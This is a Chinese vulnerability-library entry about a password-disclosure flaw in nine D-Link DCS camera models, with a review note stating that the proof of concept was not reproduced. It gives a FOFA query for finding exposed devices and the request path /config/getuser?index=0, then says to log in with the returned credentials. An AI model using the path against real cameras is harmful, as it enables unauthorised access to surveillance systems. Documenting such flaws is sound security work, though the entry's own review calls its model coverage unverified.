---
source: "wy876 漏洞文库"
id: "vw-46fc33bc6e62543706cf52fb"
entity_id: "ve-46fc33bc6e62543706cf52fb"
schema_version: "1"
title: "D-Link DCS监控系统getuser存在密码泄露漏洞"
product: "D-Link DCS2530L/2670L/4603/4622/4701E/4703E/4705E/4802E/P703"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "各型号固件及认证未给"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/D-Link/D-LinkDCS%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9Fgetuser%E5%AD%98%E5%9C%A8%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/lv9ugvkave8utxf5"
source_status: "recorded"
---

# D-Link DCS监控系统getuser存在密码泄露漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：D-Link DCS2530L/2670L/4603/4622/4701E/4703E/4705E/4802E/P703
- 本文讨论：config/getuser index0泄露
- 版本、权限与配置前提：各型号固件及认证未给
- 资料类型：摄像机凭据泄露单路径；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 9型号只一条URL无固件矩阵/返回字段/官方来源
- DCS4622单指纹不能覆盖全列表；密码格式及能否直接登录未证明

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- CVE映射、各型号实际影响和口令字段待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
D-Link DCS是一款监控摄像机，成像色彩为彩色 是一款网络摄像机，该监控存在账号密码信息泄露漏洞，恶意攻击者可通过访问特定的URL可以得到账号密码信息，直接进入利用漏洞得到账户密码直接进入后台。

# 二、影响版本
+ DCS-2530L
+ DCS-2670L
+ DCS-4603
+ DCS-4622
+ DCS-4701E
+ DCS-4703E
+ DCS-4705E
+ DCS-4802E
+ DCS-P703

# 三、资产测绘
+ fofa`app="D_Link-DCS-4622"`
+ 特征


# 四、漏洞复现
```java
/config/getuser?index=0
```


使用获取到的账号密码登录


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lv9ugvkave8utxf5>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
